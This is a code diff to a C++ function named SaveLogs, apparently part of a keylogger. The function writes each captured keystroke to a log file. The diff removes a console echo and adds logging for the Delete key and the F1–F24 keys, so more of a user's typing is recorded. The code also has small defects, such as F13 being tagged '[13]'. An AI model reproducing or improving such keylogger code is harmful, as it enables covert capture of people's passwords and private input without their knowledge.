@@ -34,9 +34,8 @@ int SaveLogs(int key_stroke, const char* file)   // Here we define our SaveLogs 
         return 0;
 
     FILE* OUTPUT_FILE;
-    fopen_s(&OUTPUT_FILE,file, "a");
 
-    cout << key_stroke << endl;
+    fopen_s(&OUTPUT_FILE,file, "a");
 
     if (key_stroke == 8)  // The numbers stands for the ascii value of a character
         fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
@@ -66,6 +65,56 @@ int SaveLogs(int key_stroke, const char* file)   // Here we define our SaveLogs 
         fprintf(OUTPUT_FILE, "%s", "[DOWN]");
     else if (key_stroke == 190 || key_stroke == 110)
         fprintf(OUTPUT_FILE, "%s", ".");
+    else if (key_stroke == VK_DELETE)
+        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
+    else if (key_stroke == VK_F1)
+        fprintf(OUTPUT_FILE, "%s", "[F1]");
+    else if (key_stroke == VK_F2)
+        fprintf(OUTPUT_FILE, "%s", "[F2]");
+    else if (key_stroke == VK_F3)
+        fprintf(OUTPUT_FILE, "%s", "[F3]");
+    else if (key_stroke == VK_F4)
+        fprintf(OUTPUT_FILE, "%s", "[F4]");
+    else if (key_stroke == VK_F5)
+        fprintf(OUTPUT_FILE, "%s", "[F5]");
+    else if (key_stroke == VK_F6)
+        fprintf(OUTPUT_FILE, "%s", "[F6]");
+    else if (key_stroke == VK_F7)
+        fprintf(OUTPUT_FILE, "%s", "[F7]");
+    else if (key_stroke == VK_F8)
+        fprintf(OUTPUT_FILE, "%s", "[F8]");
+    else if (key_stroke == VK_F9)
+        fprintf(OUTPUT_FILE, "%s", "[F9]");
+    else if (key_stroke == VK_F10)
+        fprintf(OUTPUT_FILE, "%s", "[F10]");
+    else if (key_stroke == VK_F11)
+        fprintf(OUTPUT_FILE, "%s", "[F11]");
+    else if (key_stroke == VK_F12)
+        fprintf(OUTPUT_FILE, "%s", "[F12]");
+    else if (key_stroke == VK_F13)
+        fprintf(OUTPUT_FILE, "%s", "[13]");
+    else if (key_stroke == VK_F14)
+        fprintf(OUTPUT_FILE, "%s", "[F14]");
+    else if (key_stroke == VK_F15)
+        fprintf(OUTPUT_FILE, "%s", "[F15]");
+    else if (key_stroke == VK_F16)
+        fprintf(OUTPUT_FILE, "%s", "[F16]");
+    else if (key_stroke == VK_F17)
+        fprintf(OUTPUT_FILE, "%s", "[F17]");
+    else if (key_stroke == VK_F18)
+        fprintf(OUTPUT_FILE, "%s", "[F18]");
+    else if (key_stroke == VK_F19)
+        fprintf(OUTPUT_FILE, "%s", "[F19]");
+    else if (key_stroke == VK_F20)
+        fprintf(OUTPUT_FILE, "%s", "[F20]");
+    else if (key_stroke == VK_F21)
+        fprintf(OUTPUT_FILE, "%s", "[F21]");
+    else if (key_stroke == VK_F22)
+        fprintf(OUTPUT_FILE, "%s", "[F22]");
+    else if (key_stroke == VK_F23)
+        fprintf(OUTPUT_FILE, "%s", "[F23]");
+    else if (key_stroke == VK_F24)
+        fprintf(OUTPUT_FILE, "%s", "[F24]");
     else
         fprintf(OUTPUT_FILE, "%s", &key_stroke);
 
